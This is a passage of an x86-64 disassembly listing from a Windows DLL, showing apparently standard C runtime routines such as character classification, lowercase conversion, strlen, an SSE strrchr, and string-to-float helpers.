   18000a515:	cc                   	int3
   18000a516:	cc                   	int3
   18000a517:	cc                   	int3
   18000a518:	83 25 61 25 01 00 00 	andl   $0x0,0x12561(%rip)        # 0x18001ca80
   18000a51f:	c3                   	ret
   18000a520:	40 53                	rex push %rbx
   18000a522:	48 83 ec 40          	sub    $0x40,%rsp
   18000a526:	83 3d 47 0f 01 00 00 	cmpl   $0x0,0x10f47(%rip)        # 0x18001b474
   18000a52d:	48 63 d9             	movslq %ecx,%rbx
   18000a530:	75 10                	jne    0x18000a542
   18000a532:	48 8b 05 df f5 00 00 	mov    0xf5df(%rip),%rax        # 0x180019b18
   18000a539:	0f b7 04 58          	movzwl (%rax,%rbx,2),%eax
   18000a53d:	83 e0 04             	and    $0x4,%eax
   18000a540:	eb 52                	jmp    0x18000a594
   18000a542:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000a547:	33 d2                	xor    %edx,%edx
   18000a549:	e8 a6 b9 ff ff       	call   0x180005ef4
   18000a54e:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   18000a553:	83 b8 d4 00 00 00 01 	cmpl   $0x1,0xd4(%rax)
   18000a55a:	7e 15                	jle    0x18000a571
   18000a55c:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   18000a561:	ba 04 00 00 00       	mov    $0x4,%edx
   18000a566:	8b cb                	mov    %ebx,%ecx
   18000a568:	e8 07 e6 ff ff       	call   0x180008b74
   18000a56d:	8b c8                	mov    %eax,%ecx
   18000a56f:	eb 0e                	jmp    0x18000a57f
   18000a571:	48 8b 80 08 01 00 00 	mov    0x108(%rax),%rax
   18000a578:	0f b7 0c 58          	movzwl (%rax,%rbx,2),%ecx
   18000a57c:	83 e1 04             	and    $0x4,%ecx
   18000a57f:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   18000a584:	74 0c                	je     0x18000a592
   18000a586:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   18000a58b:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   18000a592:	8b c1                	mov    %ecx,%eax
   18000a594:	48 83 c4 40          	add    $0x40,%rsp
   18000a598:	5b                   	pop    %rbx
   18000a599:	c3                   	ret
   18000a59a:	cc                   	int3
   18000a59b:	cc                   	int3
   18000a59c:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   18000a5a1:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   18000a5a6:	55                   	push   %rbp
   18000a5a7:	48 8b ec             	mov    %rsp,%rbp
   18000a5aa:	48 83 ec 70          	sub    $0x70,%rsp
   18000a5ae:	48 63 f9             	movslq %ecx,%rdi
   18000a5b1:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   18000a5b5:	e8 3a b9 ff ff       	call   0x180005ef4
   18000a5ba:	81 ff 00 01 00 00    	cmp    $0x100,%edi
   18000a5c0:	73 5d                	jae    0x18000a61f
   18000a5c2:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
   18000a5c6:	83 ba d4 00 00 00 01 	cmpl   $0x1,0xd4(%rdx)
   18000a5cd:	7e 16                	jle    0x18000a5e5
   18000a5cf:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   18000a5d3:	ba 01 00 00 00       	mov    $0x1,%edx
   18000a5d8:	8b cf                	mov    %edi,%ecx
   18000a5da:	e8 95 e5 ff ff       	call   0x180008b74
   18000a5df:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
   18000a5e3:	eb 0e                	jmp    0x18000a5f3
   18000a5e5:	48 8b 82 08 01 00 00 	mov    0x108(%rdx),%rax
   18000a5ec:	0f b7 04 78          	movzwl (%rax,%rdi,2),%eax
   18000a5f0:	83 e0 01             	and    $0x1,%eax
   18000a5f3:	85 c0                	test   %eax,%eax
   18000a5f5:	74 10                	je     0x18000a607
   18000a5f7:	48 8b 82 10 01 00 00 	mov    0x110(%rdx),%rax
   18000a5fe:	0f b6 04 38          	movzbl (%rax,%rdi,1),%eax
   18000a602:	e9 c4 00 00 00       	jmp    0x18000a6cb
   18000a607:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   18000a60b:	74 0b                	je     0x18000a618
   18000a60d:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   18000a611:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   18000a618:	8b c7                	mov    %edi,%eax
   18000a61a:	e9 bd 00 00 00       	jmp    0x18000a6dc
   18000a61f:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   18000a623:	83 b8 d4 00 00 00 01 	cmpl   $0x1,0xd4(%rax)
   18000a62a:	7e 2b                	jle    0x18000a657
   18000a62c:	44 8b f7             	mov    %edi,%r14d
   18000a62f:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   18000a633:	41 c1 fe 08          	sar    $0x8,%r14d
   18000a637:	41 0f b6 ce          	movzbl %r14b,%ecx
   18000a63b:	e8 48 1d 00 00       	call   0x18000c388
   18000a640:	85 c0                	test   %eax,%eax
   18000a642:	74 13                	je     0x18000a657
   18000a644:	44 88 75 10          	mov    %r14b,0x10(%rbp)
   18000a648:	40 88 7d 11          	mov    %dil,0x11(%rbp)
   18000a64c:	c6 45 12 00          	movb   $0x0,0x12(%rbp)
   18000a650:	b9 02 00 00 00       	mov    $0x2,%ecx
   18000a655:	eb 18                	jmp    0x18000a66f
   18000a657:	e8 d4 cf ff ff       	call   0x180007630
   18000a65c:	b9 01 00 00 00       	mov    $0x1,%ecx
   18000a661:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   18000a667:	40 88 7d 10          	mov    %dil,0x10(%rbp)
   18000a66b:	c6 45 11 00          	movb   $0x0,0x11(%rbp)
   18000a66f:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
   18000a673:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   18000a67a:	00 
   18000a67b:	4c 8d 4d 10          	lea    0x10(%rbp),%r9
   18000a67f:	8b 42 04             	mov    0x4(%rdx),%eax
   18000a682:	48 8b 92 38 01 00 00 	mov    0x138(%rdx),%rdx
   18000a689:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   18000a68f:	89 44 24 38          	mov    %eax,0x38(%rsp)
   18000a693:	48 8d 45 20          	lea    0x20(%rbp),%rax
   18000a697:	c7 44 24 30 03 00 00 	movl   $0x3,0x30(%rsp)
   18000a69e:	00 
   18000a69f:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   18000a6a4:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   18000a6a8:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   18000a6ac:	e8 4b 1a 00 00       	call   0x18000c0fc
   18000a6b1:	85 c0                	test   %eax,%eax
   18000a6b3:	0f 84 4e ff ff ff    	je     0x18000a607
   18000a6b9:	83 f8 01             	cmp    $0x1,%eax
   18000a6bc:	0f b6 45 20          	movzbl 0x20(%rbp),%eax
   18000a6c0:	74 09                	je     0x18000a6cb
   18000a6c2:	0f b6 4d 21          	movzbl 0x21(%rbp),%ecx
   18000a6c6:	c1 e0 08             	shl    $0x8,%eax
   18000a6c9:	0b c1                	or     %ecx,%eax
   18000a6cb:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   18000a6cf:	74 0b                	je     0x18000a6dc
   18000a6d1:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   18000a6d5:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   18000a6dc:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   18000a6e1:	49 8b 7b 18          	mov    0x18(%r11),%rdi
   18000a6e5:	4d 8b 73 28          	mov    0x28(%r11),%r14
   18000a6e9:	49 8b e3             	mov    %r11,%rsp
   18000a6ec:	5d                   	pop    %rbp
   18000a6ed:	c3                   	ret
   18000a6ee:	cc                   	int3
   18000a6ef:	cc                   	int3
   18000a6f0:	83 3d 7d 0d 01 00 00 	cmpl   $0x0,0x10d7d(%rip)        # 0x18001b474
   18000a6f7:	75 0e                	jne    0x18000a707
   18000a6f9:	8d 41 bf             	lea    -0x41(%rcx),%eax
   18000a6fc:	83 f8 19             	cmp    $0x19,%eax
   18000a6ff:	77 03                	ja     0x18000a704
   18000a701:	83 c1 20             	add    $0x20,%ecx
   18000a704:	8b c1                	mov    %ecx,%eax
   18000a706:	c3                   	ret
   18000a707:	33 d2                	xor    %edx,%edx
   18000a709:	e9 8e fe ff ff       	jmp    0x18000a59c
   18000a70e:	cc                   	int3
   18000a70f:	cc                   	int3
   18000a710:	cc                   	int3
   18000a711:	cc                   	int3
   18000a712:	cc                   	int3
   18000a713:	cc                   	int3
   18000a714:	cc                   	int3
   18000a715:	cc                   	int3
   18000a716:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000a71d:	00 00 00 
   18000a720:	48 8b c1             	mov    %rcx,%rax
   18000a723:	48 f7 d9             	neg    %rcx
   18000a726:	48 a9 07 00 00 00    	test   $0x7,%rax
   18000a72c:	74 0f                	je     0x18000a73d
   18000a72e:	66 90                	xchg   %ax,%ax
   18000a730:	8a 10                	mov    (%rax),%dl
   18000a732:	48 ff c0             	inc    %rax
   18000a735:	84 d2                	test   %dl,%dl
   18000a737:	74 5f                	je     0x18000a798
   18000a739:	a8 07                	test   $0x7,%al
   18000a73b:	75 f3                	jne    0x18000a730
   18000a73d:	49 b8 ff fe fe fe fe 	movabs $0x7efefefefefefeff,%r8
   18000a744:	fe fe 7e 
   18000a747:	49 bb 00 01 01 01 01 	movabs $0x8101010101010100,%r11
   18000a74e:	01 01 81 
   18000a751:	48 8b 10             	mov    (%rax),%rdx
   18000a754:	4d 8b c8             	mov    %r8,%r9
   18000a757:	48 83 c0 08          	add    $0x8,%rax
   18000a75b:	4c 03 ca             	add    %rdx,%r9
   18000a75e:	48 f7 d2             	not    %rdx
   18000a761:	49 33 d1             	xor    %r9,%rdx
   18000a764:	49 23 d3             	and    %r11,%rdx
   18000a767:	74 e8                	je     0x18000a751
   18000a769:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   18000a76d:	84 d2                	test   %dl,%dl
   18000a76f:	74 51                	je     0x18000a7c2
   18000a771:	84 f6                	test   %dh,%dh
   18000a773:	74 47                	je     0x18000a7bc
   18000a775:	48 c1 ea 10          	shr    $0x10,%rdx
   18000a779:	84 d2                	test   %dl,%dl
   18000a77b:	74 39                	je     0x18000a7b6
   18000a77d:	84 f6                	test   %dh,%dh
   18000a77f:	74 2f                	je     0x18000a7b0
   18000a781:	48 c1 ea 10          	shr    $0x10,%rdx
   18000a785:	84 d2                	test   %dl,%dl
   18000a787:	74 21                	je     0x18000a7aa
   18000a789:	84 f6                	test   %dh,%dh
   18000a78b:	74 17                	je     0x18000a7a4
   18000a78d:	c1 ea 10             	shr    $0x10,%edx
   18000a790:	84 d2                	test   %dl,%dl
   18000a792:	74 0a                	je     0x18000a79e
   18000a794:	84 f6                	test   %dh,%dh
   18000a796:	75 b9                	jne    0x18000a751
   18000a798:	48 8d 44 01 ff       	lea    -0x1(%rcx,%rax,1),%rax
   18000a79d:	c3                   	ret
   18000a79e:	48 8d 44 01 fe       	lea    -0x2(%rcx,%rax,1),%rax
   18000a7a3:	c3                   	ret
   18000a7a4:	48 8d 44 01 fd       	lea    -0x3(%rcx,%rax,1),%rax
   18000a7a9:	c3                   	ret
   18000a7aa:	48 8d 44 01 fc       	lea    -0x4(%rcx,%rax,1),%rax
   18000a7af:	c3                   	ret
   18000a7b0:	48 8d 44 01 fb       	lea    -0x5(%rcx,%rax,1),%rax
   18000a7b5:	c3                   	ret
   18000a7b6:	48 8d 44 01 fa       	lea    -0x6(%rcx,%rax,1),%rax
   18000a7bb:	c3                   	ret
   18000a7bc:	48 8d 44 01 f9       	lea    -0x7(%rcx,%rax,1),%rax
   18000a7c1:	c3                   	ret
   18000a7c2:	48 8d 44 01 f8       	lea    -0x8(%rcx,%rax,1),%rax
   18000a7c7:	c3                   	ret
   18000a7c8:	48 83 ec 18          	sub    $0x18,%rsp
   18000a7cc:	45 33 c0             	xor    %r8d,%r8d
   18000a7cf:	4c 8b c9             	mov    %rcx,%r9
   18000a7d2:	85 d2                	test   %edx,%edx
   18000a7d4:	75 48                	jne    0x18000a81e
   18000a7d6:	41 83 e1 0f          	and    $0xf,%r9d
   18000a7da:	48 8b d1             	mov    %rcx,%rdx
   18000a7dd:	0f 57 c9             	xorps  %xmm1,%xmm1
   18000a7e0:	48 83 e2 f0          	and    $0xfffffffffffffff0,%rdx
   18000a7e4:	41 8b c9             	mov    %r9d,%ecx
   18000a7e7:	41 83 c9 ff          	or     $0xffffffff,%r9d
   18000a7eb:	41 d3 e1             	shl    %cl,%r9d
   18000a7ee:	66 0f 6f 02          	movdqa (%rdx),%xmm0
   18000a7f2:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   18000a7f6:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   18000a7fa:	41 23 c1             	and    %r9d,%eax
   18000a7fd:	75 14                	jne    0x18000a813
   18000a7ff:	48 83 c2 10          	add    $0x10,%rdx
   18000a803:	66 0f 6f 02          	movdqa (%rdx),%xmm0
   18000a807:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   18000a80b:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   18000a80f:	85 c0                	test   %eax,%eax
   18000a811:	74 ec                	je     0x18000a7ff
   18000a813:	0f bc c0             	bsf    %eax,%eax
   18000a816:	48 03 c2             	add    %rdx,%rax
   18000a819:	e9 a6 00 00 00       	jmp    0x18000a8c4
   18000a81e:	83 3d fb e7 00 00 02 	cmpl   $0x2,0xe7fb(%rip)        # 0x180019020
   18000a825:	0f 8d 9e 00 00 00    	jge    0x18000a8c9
   18000a82b:	4c 8b d1             	mov    %rcx,%r10
   18000a82e:	0f b6 c2             	movzbl %dl,%eax
   18000a831:	41 83 e1 0f          	and    $0xf,%r9d
   18000a835:	49 83 e2 f0          	and    $0xfffffffffffffff0,%r10
   18000a839:	8b c8                	mov    %eax,%ecx
   18000a83b:	0f 57 d2             	xorps  %xmm2,%xmm2
   18000a83e:	c1 e1 08             	shl    $0x8,%ecx
   18000a841:	0b c8                	or     %eax,%ecx
   18000a843:	66 0f 6e c1          	movd   %ecx,%xmm0
   18000a847:	41 8b c9             	mov    %r9d,%ecx
   18000a84a:	41 83 c9 ff          	or     $0xffffffff,%r9d
   18000a84e:	41 d3 e1             	shl    %cl,%r9d
   18000a851:	f2 0f 70 c8 00       	pshuflw $0x0,%xmm0,%xmm1
   18000a856:	66 0f 6f c2          	movdqa %xmm2,%xmm0
   18000a85a:	66 41 0f 74 02       	pcmpeqb (%r10),%xmm0
   18000a85f:	66 0f 70 d9 00       	pshufd $0x0,%xmm1,%xmm3
   18000a864:	66 0f d7 c8          	pmovmskb %xmm0,%ecx
   18000a868:	66 0f 6f c3          	movdqa %xmm3,%xmm0
   18000a86c:	66 41 0f 74 02       	pcmpeqb (%r10),%xmm0
   18000a871:	66 0f d7 d0          	pmovmskb %xmm0,%edx
   18000a875:	41 23 d1             	and    %r9d,%edx
   18000a878:	41 23 c9             	and    %r9d,%ecx
   18000a87b:	75 2e                	jne    0x18000a8ab
   18000a87d:	0f bd ca             	bsr    %edx,%ecx
   18000a880:	66 0f 6f ca          	movdqa %xmm2,%xmm1
   18000a884:	66 0f 6f c3          	movdqa %xmm3,%xmm0
   18000a888:	49 03 ca             	add    %r10,%rcx
   18000a88b:	85 d2                	test   %edx,%edx
   18000a88d:	4c 0f 45 c1          	cmovne %rcx,%r8
   18000a891:	49 83 c2 10          	add    $0x10,%r10
   18000a895:	66 41 0f 74 0a       	pcmpeqb (%r10),%xmm1
   18000a89a:	66 41 0f 74 02       	pcmpeqb (%r10),%xmm0
   18000a89f:	66 0f d7 c9          	pmovmskb %xmm1,%ecx
   18000a8a3:	66 0f d7 d0          	pmovmskb %xmm0,%edx
   18000a8a7:	85 c9                	test   %ecx,%ecx
   18000a8a9:	74 d2                	je     0x18000a87d
   18000a8ab:	8b c1                	mov    %ecx,%eax
   18000a8ad:	f7 d8                	neg    %eax
   18000a8af:	23 c1                	and    %ecx,%eax
   18000a8b1:	ff c8                	dec    %eax
   18000a8b3:	23 d0                	and    %eax,%edx
   18000a8b5:	0f bd ca             	bsr    %edx,%ecx
   18000a8b8:	49 03 ca             	add    %r10,%rcx
   18000a8bb:	85 d2                	test   %edx,%edx
   18000a8bd:	4c 0f 45 c1          	cmovne %rcx,%r8
   18000a8c1:	49 8b c0             	mov    %r8,%rax
   18000a8c4:	48 83 c4 18          	add    $0x18,%rsp
   18000a8c8:	c3                   	ret
   18000a8c9:	f6 c1 0f             	test   $0xf,%cl
   18000a8cc:	74 19                	je     0x18000a8e7
   18000a8ce:	41 0f be 01          	movsbl (%r9),%eax
   18000a8d2:	3b c2                	cmp    %edx,%eax
   18000a8d4:	4d 0f 44 c1          	cmove  %r9,%r8
   18000a8d8:	41 80 39 00          	cmpb   $0x0,(%r9)
   18000a8dc:	74 e3                	je     0x18000a8c1
   18000a8de:	49 ff c1             	inc    %r9
   18000a8e1:	41 f6 c1 0f          	test   $0xf,%r9b
   18000a8e5:	75 e7                	jne    0x18000a8ce
   18000a8e7:	0f b6 c2             	movzbl %dl,%eax
   18000a8ea:	66 0f 6e c0          	movd   %eax,%xmm0
   18000a8ee:	66 41 0f 3a 63 01 40 	pcmpistri $0x40,(%r9),%xmm0
   18000a8f5:	73 0d                	jae    0x18000a904
   18000a8f7:	4c 63 c1             	movslq %ecx,%r8
   18000a8fa:	4d 03 c1             	add    %r9,%r8
   18000a8fd:	66 41 0f 3a 63 01 40 	pcmpistri $0x40,(%r9),%xmm0
   18000a904:	74 bb                	je     0x18000a8c1
   18000a906:	49 83 c1 10          	add    $0x10,%r9
   18000a90a:	eb e2                	jmp    0x18000a8ee
   18000a90c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000a911:	57                   	push   %rdi
   18000a912:	48 83 ec 20          	sub    $0x20,%rsp
   18000a916:	48 8b d9             	mov    %rcx,%rbx
   18000a919:	49 8b 49 10          	mov    0x10(%r9),%rcx
   18000a91d:	45 33 d2             	xor    %r10d,%r10d
   18000a920:	48 85 db             	test   %rbx,%rbx
   18000a923:	75 18                	jne    0x18000a93d
   18000a925:	e8 06 cd ff ff       	call   0x180007630
   18000a92a:	bb 16 00 00 00       	mov    $0x16,%ebx
   18000a92f:	89 18                	mov    %ebx,(%rax)
   18000a931:	e8 2e cc ff ff       	call   0x180007564
   18000a936:	8b c3                	mov    %ebx,%eax
   18000a938:	e9 8f 00 00 00       	jmp    0x18000a9cc
   18000a93d:	48 85 d2             	test   %rdx,%rdx
   18000a940:	74 e3                	je     0x18000a925
   18000a942:	41 8b c2             	mov    %r10d,%eax
   18000a945:	45 85 c0             	test   %r8d,%r8d
   18000a948:	44 88 13             	mov    %r10b,(%rbx)
   18000a94b:	41 0f 4f c0          	cmovg  %r8d,%eax
   18000a94f:	ff c0                	inc    %eax
   18000a951:	48 98                	cltq
   18000a953:	48 3b d0             	cmp    %rax,%rdx
   18000a956:	77 0c                	ja     0x18000a964
   18000a958:	e8 d3 cc ff ff       	call   0x180007630
   18000a95d:	bb 22 00 00 00       	mov    $0x22,%ebx
   18000a962:	eb cb                	jmp    0x18000a92f
   18000a964:	48 8d 7b 01          	lea    0x1(%rbx),%rdi
   18000a968:	c6 03 30             	movb   $0x30,(%rbx)
   18000a96b:	48 8b c7             	mov    %rdi,%rax
   18000a96e:	eb 1a                	jmp    0x18000a98a
   18000a970:	44 38 11             	cmp    %r10b,(%rcx)
   18000a973:	74 08                	je     0x18000a97d
   18000a975:	0f be 11             	movsbl (%rcx),%edx
   18000a978:	48 ff c1             	inc    %rcx
   18000a97b:	eb 05                	jmp    0x18000a982
   18000a97d:	ba 30 00 00 00       	mov    $0x30,%edx
   18000a982:	88 10                	mov    %dl,(%rax)
   18000a984:	48 ff c0             	inc    %rax
   18000a987:	41 ff c8             	dec    %r8d
   18000a98a:	45 85 c0             	test   %r8d,%r8d
   18000a98d:	7f e1                	jg     0x18000a970
   18000a98f:	44 88 10             	mov    %r10b,(%rax)
   18000a992:	78 14                	js     0x18000a9a8
   18000a994:	80 39 35             	cmpb   $0x35,(%rcx)
   18000a997:	7c 0f                	jl     0x18000a9a8
   18000a999:	eb 03                	jmp    0x18000a99e
   18000a99b:	c6 00 30             	movb   $0x30,(%rax)
   18000a99e:	48 ff c8             	dec    %rax
   18000a9a1:	80 38 39             	cmpb   $0x39,(%rax)
   18000a9a4:	74 f5                	je     0x18000a99b
   18000a9a6:	fe 00                	incb   (%rax)
   18000a9a8:	80 3b 31             	cmpb   $0x31,(%rbx)
   18000a9ab:	75 06                	jne    0x18000a9b3
   18000a9ad:	41 ff 41 04          	incl   0x4(%r9)
   18000a9b1:	eb 17                	jmp    0x18000a9ca
   18000a9b3:	48 8b cf             	mov    %rdi,%rcx
   18000a9b6:	e8 65 fd ff ff       	call   0x18000a720
   18000a9bb:	48 8b d7             	mov    %rdi,%rdx
   18000a9be:	48 8b cb             	mov    %rbx,%rcx
   18000a9c1:	4c 8d 40 01          	lea    0x1(%rax),%r8
   18000a9c5:	e8 26 ad ff ff       	call   0x1800056f0
   18000a9ca:	33 c0                	xor    %eax,%eax
   18000a9cc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000a9d1:	48 83 c4 20          	add    $0x20,%rsp
   18000a9d5:	5f                   	pop    %rdi
   18000a9d6:	c3                   	ret
   18000a9d7:	cc                   	int3
   18000a9d8:	40 53                	rex push %rbx
   18000a9da:	56                   	push   %rsi
   18000a9db:	57                   	push   %rdi
   18000a9dc:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   18000a9e3:	48 8b 05 16 e6 00 00 	mov    0xe616(%rip),%rax        # 0x180019000
   18000a9ea:	48 33 c4             	xor    %rsp,%rax
   18000a9ed:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   18000a9f2:	48 8b f1             	mov    %rcx,%rsi
   18000a9f5:	48 8b da             	mov    %rdx,%rbx
   18000a9f8:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   18000a9fd:	49 8b d0             	mov    %r8,%rdx
   18000aa00:	49 8b f9             	mov    %r9,%rdi
   18000aa03:	e8 ec b4 ff ff       	call   0x180005ef4
   18000aa08:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   18000aa0d:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   18000aa12:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   18000aa17:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   18000aa1c:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   18000aa21:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   18000aa26:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   18000aa2b:	45 33 c9             	xor    %r9d,%r9d
   18000aa2e:	4c 8b c3             	mov    %rbx,%r8
   18000aa31:	e8 82 2c 00 00       	call   0x18000d6b8
   18000aa36:	8b d8                	mov    %eax,%ebx
   18000aa38:	48 85 ff             	test   %rdi,%rdi
   18000aa3b:	74 08                	je     0x18000aa45
   18000aa3d:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   18000aa42:	48 89 0f             	mov    %rcx,(%rdi)
   18000aa45:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   18000aa4a:	48 8b d6             	mov    %rsi,%rdx
   18000aa4d:	e8 ae 26 00 00       	call   0x18000d100
   18000aa52:	8b c8                	mov    %eax,%ecx
   18000aa54:	b8 03 00 00 00       	mov    $0x3,%eax
   18000aa59:	84 d8                	test   %bl,%al
   18000aa5b:	75 0c                	jne    0x18000aa69
   18000aa5d:	83 f9 01             	cmp    $0x1,%ecx
   18000aa60:	74 1a                	je     0x18000aa7c
   18000aa62:	83 f9 02             	cmp    $0x2,%ecx
   18000aa65:	75 13                	jne    0x18000aa7a
   18000aa67:	eb 05                	jmp    0x18000aa6e
   18000aa69:	f6 c3 01             	test   $0x1,%bl
   18000aa6c:	74 07                	je     0x18000aa75
   18000aa6e:	b8 04 00 00 00       	mov    $0x4,%eax
   18000aa73:	eb 07                	jmp    0x18000aa7c
   18000aa75:	f6 c3 02             	test   $0x2,%bl
   18000aa78:	75 02                	jne    0x18000aa7c
   18000aa7a:	33 c0                	xor    %eax,%eax
   18000aa7c:	80 7c 24 60 00       	cmpb   $0x0,0x60(%rsp)
   18000aa81:	74 0c                	je     0x18000aa8f
   18000aa83:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   18000aa88:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   18000aa8f:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   18000aa94:	48 33 cc             	xor    %rsp,%rcx
   18000aa97:	e8 94 a7 ff ff       	call   0x180005230
   18000aa9c:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   18000aaa3:	5f                   	pop    %rdi
   18000aaa4:	5e                   	pop    %rsi
   18000aaa5:	5b                   	pop    %rbx
   18000aaa6:	c3                   	ret
   18000aaa7:	cc                   	int3
   18000aaa8:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   18000aaad:	57                   	push   %rdi
   18000aaae:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   18000aab5:	48 8b 05 44 e5 00 00 	mov    0xe544(%rip),%rax        # 0x180019000
   18000aabc:	48 33 c4             	xor    %rsp,%rax
   18000aabf:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   18000aac4:	48 8b f9             	mov    %rcx,%rdi
   18000aac7:	48 8b da             	mov    %rdx,%rbx
   18000aaca:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   18000aacf:	49 8b d0             	mov    %r8,%rdx
   18000aad2:	e8 1d b4 ff ff       	call   0x180005ef4
   18000aad7:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   18000aadc:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   18000aae1:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   18000aae6:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   18000aaeb:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   18000aaf0:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   18000aaf5:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   18000aafa:	45 33 c9             	xor    %r9d,%r9d
   18000aafd:	4c 8b c3             	mov    %rbx,%r8
   18000ab00:	e8 b3 2b 00 00       	call   0x18000d6b8
   18000ab05:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   18000ab0a:	48 8b d7             	mov    %rdi,%rdx
   18000ab0d:	8b d8                	mov    %eax,%ebx
   18000ab0f:	e8 34 20 00 00       	call   0x18000cb48
   18000ab14:	8b c8                	mov    %eax,%ecx
   18000ab16:	b8 03 00 00 00       	mov    $0x3,%eax
   18000ab1b:	84 d8                	test   %bl,%al
   18000ab1d:	75 0c                	jne    0x18000ab2b
   18000ab1f:	83 f9 01             	cmp    $0x1,%ecx
   18000ab22:	74 1a                	je     0x18000ab3e
   18000ab24:	83 f9 02             	cmp    $0x2,%ecx
   18000ab27:	75 13                	jne    0x18000ab3c
   18000ab29:	eb 05                	jmp    0x18000ab30
   18000ab2b:	f6 c3 01             	test   $0x1,%bl
   18000ab2e:	74 07                	je     0x18000ab37
   18000ab30:	b8 04 00 00 00       	mov    $0x4,%eax
   18000ab35:	eb 07                	jmp    0x18000ab3e
   18000ab37:	f6 c3 02             	test   $0x2,%bl
   18000ab3a:	75 02                	jne    0x18000ab3e
   18000ab3c:	33 c0                	xor    %eax,%eax
   18000ab3e:	80 7c 24 58 00       	cmpb   $0x0,0x58(%rsp)
   18000ab43:	74 0c                	je     0x18000ab51
   18000ab45:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   18000ab4a:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   18000ab51:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   18000ab56:	48 33 cc             	xor    %rsp,%rcx
   18000ab59:	e8 d2 a6 ff ff       	call   0x180005230
   18000ab5e:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   18000ab65:	00 
   18000ab66:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   18000ab6d:	5f                   	pop    %rdi
   18000ab6e:	c3                   	ret
   18000ab6f:	cc                   	int3
   18000ab70:	45 33 c9             	xor    %r9d,%r9d
   18000ab73:	e9 60 fe ff ff       	jmp    0x18000a9d8
   18000ab78:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000ab7d:	44 0f b7 5a 06       	movzwl 0x6(%rdx),%r11d
   18000ab82:	4c 8b d1             	mov    %rcx,%r10
   18000ab85:	8b 4a 04             	mov    0x4(%rdx),%ecx
   18000ab88:	45 0f b7 c3          	movzwl %r11w,%r8d
   18000ab8c:	b8 00 80 00 00       	mov    $0x8000,%eax
   18000ab91:	41 b9 ff 07 00 00    	mov    $0x7ff,%r9d
   18000ab97:	66 41 c1 e8 04       	shr    $0x4,%r8w
   18000ab9c:	66 44 23 d8          	and    %ax,%r11w
   18000aba0:	8b 02                	mov    (%rdx),%eax
   18000aba2:	66 45 23 c1          	and    %r9w,%r8w
   18000aba6:	81 e1 ff ff 0f 00    	and    $0xfffff,%ecx
   18000abac:	bb 00 00 00 80       	mov    $0x80000000,%ebx
   18000abb1:	41 0f b7 d0          	movzwl %r8w,%edx
   18000abb5:	85 d2                	test   %edx,%edx
   18000abb7:	74 18                	je     0x18000abd1
